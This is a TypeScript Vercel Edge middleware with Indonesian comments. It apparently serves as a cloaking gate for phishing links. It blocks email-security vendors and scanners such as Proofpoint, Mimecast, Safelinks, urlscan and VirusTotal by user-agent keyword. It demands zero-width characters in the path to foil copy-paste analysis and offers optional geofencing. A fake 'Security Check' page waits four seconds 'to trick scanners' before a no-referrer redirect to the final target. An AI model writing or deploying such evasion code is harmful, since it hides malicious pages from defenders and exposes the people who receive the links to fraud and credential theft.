// Konfigurasi Runtime Vercel Edge
export const config = {
  runtime: "edge",
};

export default async function middleware(req: Request) {
  const url = new URL(req.url);
  const ua = req.headers.get("user-agent") || "Unknown";
  const uaLower = ua.toLowerCase();

  // Mendapatkan IP & Lokasi dari Vercel Headers
  const ip = req.headers.get("x-real-ip")
    || req.headers.get("x-forwarded-for")?.split(",")[0]?.trim()
    || "Unknown";
  
  const country = req.headers.get("x-vercel-ip-country") || "Unknown";

  // ═══ 1. GEOFENCING (OPSIONAL) ═══
  // Jika target Anda hanya Indonesia (ID), aktifkan ini untuk blokir IP asing/VPN/Bot Keamanan
  /*
  if (country !== "ID" && country !== "Unknown") {
    console.log(`❌ BLOCKED GEO: IP=${ip} | COUNTRY=${country}`);
    return new Response("404 Not Found", { status: 404 });
  }
  */

  // ═══ 2. STATIC FILES FILTER ═══
  if (/favicon|manifest|\.ico|\.png|robots\.txt/.test(url.pathname)) {
    return new Response(null, { status: 204 });
  }

  // ═══ 3. VERIFY TOKEN (POST-CHALLENGE) ═══
  if (url.pathname === "/verify") {
    const token = url.searchParams.get("t");
    const ts = url.searchParams.get("ts");
    const now = Date.now();

    if (token && ts) {
      const elapsed = now - parseInt(ts);

      // Bot biasanya submit instan, manusia butuh waktu baca/loading
      if (elapsed < 3000) { 
        console.log(`❌ BLOCKED BOT (TOO FAST): IP=${ip} | TIME=${elapsed}ms`);
        return new Response("Forbidden", { status: 403 });
      }

      console.log(`🚀 HUMAN VERIFIED: IP=${ip} | COUNTRY=${country}`);
      
      // TARGET REDIRECT AKHIR
      const targetUrl = "https://debounce.com";

      // MENGGUNAKAN CLIENT-SIDE REDIRECT (Anti-302 Tracking)
      const redirectHTML = `
      <html><head><meta name="referrer" content="no-referrer"><script>
        setTimeout(function(){ window.location.replace("${targetUrl}"); }, 200);
      </script></head><body>Redirecting...</body></html>`;

      return new Response(redirectHTML, {
        status: 200,
        headers: { "Content-Type": "text/html; charset=utf-8" },
      });
    }
    return new Response("Access Denied", { status: 403 });
  }

  // ═══ 4. ZWC CHECK (Anti Copy-Paste) ═══
  let decodedPath = "";
  try { decodedPath = decodeURIComponent(url.pathname); } catch(e) { decodedPath = url.pathname; }
  const hasZwc = /[\u200B-\u200D\uFEFF]/.test(decodedPath);

  if (!hasZwc && url.pathname !== "/") {
    console.log(`⚠️ NO ZWC: IP=${ip} | PATH=${url.pathname}`);
    return new Response("404 Not Found", { status: 404 });
  }

  // ═══ 5. BOT & SECURITY VENDOR DETECTION ═══
  const botUA = [
    "vade", "vadesecure", "proofpoint", "pphosted", "cloudmark", "barracuda", 
    "mimecast", "fireeye", "trellix", "ironport", "sophos", "forcepoint", 
    "websense", "symantec", "messagelabs", "fortinet", "fortigate", "trendmicro", 
    "spamhaus", "spamexperts", "mailguard", "avanan", "abnormal", "bitdefender", 
    "kaspersky", "eset", "mcafee", "agari", "zerospam", "hornetsecurity", 
    "microsoft", "azure", "office", "outlook", "safelinks", "googlebot",
    "bot", "crawl", "spider", "headless", "puppeteer", "selenium", "urlscan", "virustotal"
  ];

  const matchedUA = botUA.find((kw) => uaLower.includes(kw));
  if (matchedUA) {
    console.log(`❌ BLOCKED BOT (UA): IP=${ip} | MATCH=${matchedUA}`);
    return new Response("Forbidden", { status: 403 });
  }

  // ═══ 6. FINGERPRINT & BEHAVIOR ═══
  const hasAcceptLang = req.headers.has("accept-language");
  const isRealBrowser = uaLower.length >= 35 && hasAcceptLang;

  if (!isRealBrowser) {
    console.log(`❌ BLOCKED BOT (FINGERPRINT): IP=${ip}`);
    return new Response("Forbidden", { status: 403 });
  }

  // ═══ 7. JS CHALLENGE PAGE (The "Gate") ═══
  const ts = Date.now();
  const challengeHTML = `<!DOCTYPE html>
  <html><head>
  <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Security Check</title>
  <style>
    body{font-family:sans-serif;background:#f4f7f9;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
    .card{background:#fff;padding:30px;border-radius:8px;box-shadow:0 4px 15px rgba(0,0,0,0.1);text-align:center;max-width:350px}
    .spinner{border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:0 auto 15px}
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    h2{font-size:18px;color:#333}
  </style>
  </head><body>
  <div class="card">
    <div class="spinner"></div>
    <h2>Verifying your connection...</h2>
    <p style="font-size:13px;color:#666">Please wait while we secure your session.</p>
  </div>
  <script>
    (function(){
      var ts = ${ts};
      var interaction = false;
      // Deteksi interaksi nyata
      ['mousemove','touchstart','keydown'].forEach(e => {
        document.addEventListener(e, () => { interaction = true; }, {once:true});
      });

      // Validasi Headless Stealth
      var isHeadless = navigator.webdriver || window.outerWidth === 0 || window.outerHeight === 0;
      
      setTimeout(function(){
        if(isHeadless) {
          document.body.innerHTML = "<h1>Access Denied</h1>";
          return;
        }
        var token = btoa(ts + ':' + (interaction ? 'human' : 'passive'));
        window.location.href = '/verify?t=' + encodeURIComponent(token) + '&ts=' + ts;
      }, 4000); // Wait 4 seconds to trick scanners
    })();
  </script>
  </body></html>`;

  return new Response(challengeHTML, {
    status: 200,
    headers: { "Content-Type": "text/html; charset=utf-8" },
  });
}
